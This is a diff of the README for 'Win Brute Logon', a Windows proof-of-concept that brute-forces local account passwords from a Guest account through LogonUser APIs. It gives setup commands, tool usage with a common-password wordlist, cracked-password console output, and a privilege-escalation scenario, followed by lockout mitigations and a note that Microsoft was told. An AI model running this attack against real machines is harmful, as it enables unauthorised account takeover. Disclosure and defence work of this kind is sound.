@@ -1,44 +1,135 @@
 # Win Brute Logon (Proof Of Concept)
 
-Release date : `2020-05-14`
+Release date: `2020-05-14`
 
-## Briefly
-
-I was doing some research about some specific API's for a huge InfoSec project I'm working on (It will be release very soon) when I found something unbelievable.
-
-You can call `LogonUserW` API with wrong user information any time you want without any restriction / lockdown or special privilege.
-
-This means that even from a Guest account, the most restricted Windows User Account, you can crack any user password in just few minutes (depending on the complexity of the password and number of available cores)
-
-It is not what we could call a vulnerability but more a serious weakness in user authentication. 
-
-I hope to see Microsoft implementing a security lockdown and slow the process of authentication using those API's.
-
-A use case, whould be during your PenTest, after gaining access to a low priv user escalating your privileges.
-
-## Information
-
-Tested on Windows 10 latest version 64bit/32bit - (1909 - Build 18363.778).
-Tested on Windows 7 latest version 64bit/32bit.
-
-Will surely work on any previous Windows Versions.
-
-The PoC is multithreaded to speed up the process, I will probably improve that part in a near future.
-
-I used a very low performance VM (2 Cores) for the test, I successfully cracked the password in just few seconds. You can find the video in my Twitter account : @DarkCoderSc
-
-I also tried on a slitly better machine (4 core) Intel core i3 NUC and I was able to test arround 10 000 passwords / sec which is incredible. 
-
-You will find in the repository both compiled version for 32 and 64bit.
-
-You will need Delphi (Free version or not) to compile yourself the program.
+Target: Windows XP to Latest Windows 10 Version (1909)
 
 ![Console](https://i.ibb.co/Cm5052S/screen.png)
 
-# Mitigation
+Weakness location : `LogonUserA`, `LogonUserW`, `CreateProcessWithLogonA`, `CreateProcessWithLogonW`
+
+# Introduction
+
+This PoC is more what I would call a serious weakness in Microsoft Windows Authentication mechanism than a vulnerability.
+
+The biggest issue is related to the lack of privilege required to perform such actions.
+
+Indeed, from a Guest account (The most limited account on Microsoft Windows), you can crack the password of any available local users.
+
+Find out which users exists using command : `net user`
+
+This PoC is using multithreading to speed up the process and support both 32 and 64bit.
+
+# PoC Test Scenario
+
+Tested on Windows 10 
+
+Install and configure a freshly updated Windows 10 virtual or physical machine.
+
+In my case full Windows version was : `1909 (OS Build 18363.778)`
+
+Log as administrator and lets create two different accounts : one administrator and one regular user. Both users are local.
+
+## Create a new admin user
+
+`net user darkcodersc /add`
+
+`net user darkcodersc trousers` (trousers is the password)
+
+`net localgroup administrators darkcodersc /add`
+
+## Create a regular user
+
+`net user HackMe /add`
+
+`net user HackMe ozlq6qwm` (ozlq6qwm is the password)
+
+## Create a Guest account (If not already activated)
+
+`net user Guest /add /active:yes`
+
+`net localgroup users Guest /delete`
+
+`net user Guest /add /active:yes`
+
+## Get a Wordlist 
+
+In my case both `trousers` and `ozlq6qwm` are in SecList : https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt
+
+## Start the attack
+
+Logoff from administrator account or restart your machine and log to the Guest account. 
+
+Place the PoC executable anywhere you have access as Guest user.
+
+Usage : `WinBruteLogon.exe -v -u <username> -w <wordlist_file>`
+
+`-v` is optional, it design the verbose mode.
+
+By default, domain name is the value designated by `%USERDOMAIN%` env var. You can specify a custom name with option `-d`
+
+### Crack First User : `darkcodersc` (Administrator)
+
+prompt(guest)>`WinBruteLogon.exe -v -u darkcodersc -w 10k-most-common.txt`
+
+Wait few seconds to see the following result:
+
+````
+[ .. ] Load 10k-most-common.txt file in memory...
+[DONE] 10002 passwords successfully loaded.
+[INFO] 2 cores are available
+[ .. ] Create 2 threads...
+[INFO] New "TWorker" Thread created with id=2260, handle=364
+[INFO] New "TWorker" Thread created with id=3712, handle=532
+[DONE] Done.
+[ OK ] Password for username=[darkcodersc] and domain=[DESKTOP-0885FP1] found = [trousers]
+[ .. ] Finalize and close worker threads...
+[INFO] "TWorkers"(id=2260, handle=364) Thread successfully terminated.
+[INFO] "TWorkers"(id=3712, handle=532) Thread successfully terminated.
+[DONE] Done.
+[INFO] Ellapsed Time : 00:00:06
+````
+
+### Crack Second User : `HackMe` (Regular User)
+
+prompt(guest)>`WinBruteLogon.exe -v -u HackMe -w 10k-most-common.txt`
+
+Wait few seconds to see the following result:
+
+````
+[ .. ] Load 10k-most-common.txt file in memory...
+[DONE] 10002 passwords successfully loaded.
+[INFO] 2 cores are available
+[ .. ] Create 2 threads...
+[INFO] New "TWorker" Thread created with id=5748, handle=336
+[INFO] New "TWorker" Thread created with id=4948, handle=140
+[DONE] Done.
+[ OK ] Password for username=[HackMe] and domain=[DESKTOP-0885FP1] found = [ozlq6qwm]
+[ .. ] Finalize and close worker threads...
+[INFO] "TWorkers"(id=5748, handle=336) Thread successfully terminated.
+[INFO] "TWorkers"(id=4948, handle=140) Thread successfully terminated.
+[DONE] Done.
+[INFO] Ellapsed Time : 00:00:06
+````
+
+# Real world scenario
+
+If you gain access to a low privileged user, you could crack the password of a more privileged user and escalate your privilege.
+
+# Mitigation (General)
 
 - Disable guest account if it is not absolutely required.
-- Follow the rules to create a complex password and apply to all accounts.
-- Implement lockdown mechanisms for user authentication.
+- Application white-listing.
+- Follow the guidelines to create and keep a password strong. Apply this to all users.
 
-Microsoft was alterted. 
+## Implement Security Lockout Policy (Not present by default)
+
+Open `secpol.msc` then go to `Account Policies` > `Account Lockout Policy` and edit value `Account lockout threshold` with desired value from (1 to 999).
+
+Value represent the number of possible attempt before getting locked.
+
+# Weakness Report
+
+A report was sent to Microsoft Security Team.
+
+They should at least implement by default account lockout. Actually it is not.
